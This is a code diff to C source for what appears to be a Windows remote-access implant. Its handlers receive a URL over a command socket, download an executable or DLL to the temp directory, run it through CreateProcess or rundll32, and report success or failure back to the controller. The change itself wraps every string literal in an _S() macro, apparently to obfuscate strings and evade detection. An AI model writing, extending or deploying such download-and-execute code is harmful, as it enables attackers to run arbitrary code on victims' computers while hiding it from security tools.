@@ -6,7 +6,7 @@
 
 static void rfe_send(SOCKET sock, HANDLE mutex, const char* msg) {
     char* buf = malloc(strlen(msg) + 32);
-    sprintf(buf, "[rfe_result]%s", msg);
+    sprintf(buf, _S("[rfe_result]%s"), msg);
     sock_send(sock, mutex, buf);
     free(buf);
 }
@@ -26,18 +26,18 @@ static int winhttp_download(const char* url, const char* dest_path) {
     wcsncpy(host, urlComp.lpszHostName, urlComp.dwHostNameLength);
     host[urlComp.dwHostNameLength] = 0;
 
-    HINTERNET hSession = WinHttpOpen(L"client/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    HINTERNET hSession = WinHttpOpen(_S("client/1.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return 0;
     HINTERNET hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
     if (!hConnect) { WinHttpCloseHandle(hSession); return 0; }
 
     DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, _S("GET"), urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
     if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return 0; }
 
     if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
         WinHttpReceiveResponse(hRequest, NULL)) {
-        FILE* f = fopen(dest_path, "wb");
+        FILE* f = fopen(dest_path, _S("wb"));
         if (f) {
             DWORD size = 0;
             while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
@@ -74,24 +74,24 @@ void handle_rfe_exe(SOCKET sock, HANDLE mutex, const char* payload) {
 
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
-    strcat(tmp, "tmp_exe.exe");
+    strcat(tmp, _S("tmp_exe.exe"));
 
     if (!winhttp_download(url, tmp)) {
-        rfe_send(sock, mutex, "error:Download failed");
+        rfe_send(sock, mutex, _S("error:Download failed"));
         return;
     }
 
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
     char cmd[1024];
-    sprintf(cmd, "\"%s\" %s", tmp, args);
+    sprintf(cmd, _S("\"%s\" %s"), tmp, args);
     if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
         WaitForSingleObject(pi.hProcess, INFINITE);
-        rfe_send(sock, mutex, "ok:Execution finished");
+        rfe_send(sock, mutex, _S("ok:Execution finished"));
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     } else {
-        rfe_send(sock, mutex, "error:CreateProcess failed");
+        rfe_send(sock, mutex, _S("error:CreateProcess failed"));
     }
     DeleteFileA(tmp);
 }
@@ -99,22 +99,22 @@ void handle_rfe_exe(SOCKET sock, HANDLE mutex, const char* payload) {
 void handle_rfe_dll(SOCKET sock, HANDLE mutex, const char* url) {
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
-    strcat(tmp, "tmp_dll.dll");
+    strcat(tmp, _S("tmp_dll.dll"));
 
     if (!winhttp_download(url, tmp)) {
-        rfe_send(sock, mutex, "error:Download failed");
+        rfe_send(sock, mutex, _S("error:Download failed"));
         return;
     }
 
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
     char cmd[1024];
-    sprintf(cmd, "rundll32.exe \"%s\"", tmp);
+    sprintf(cmd, _S("rundll32.exe \"%s\""), tmp);
     if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-        rfe_send(sock, mutex, "ok:rundll32 started");
+        rfe_send(sock, mutex, _S("ok:rundll32 started"));
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     } else {
-        rfe_send(sock, mutex, "error:rundll32 failed");
+        rfe_send(sock, mutex, _S("error:rundll32 failed"));
     }
 }
